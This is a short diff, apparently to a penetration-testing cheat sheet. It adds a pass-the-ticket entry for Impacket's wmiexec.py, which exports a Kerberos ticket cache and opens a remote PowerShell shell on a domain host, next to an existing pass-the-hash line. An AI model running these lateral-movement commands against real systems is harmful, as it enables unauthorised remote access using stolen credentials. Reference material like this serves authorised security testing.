@@ -20,3 +20,6 @@ wmiexec.py -shell-type powershell -hashes <nt_hash> <user>@<ip>
 ```
 
 ## wmiexec (ptt)
+```
+export KRB5CCNAME=<ccache>; wmiexec.py -shell-type powershell -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <target_name>
+```
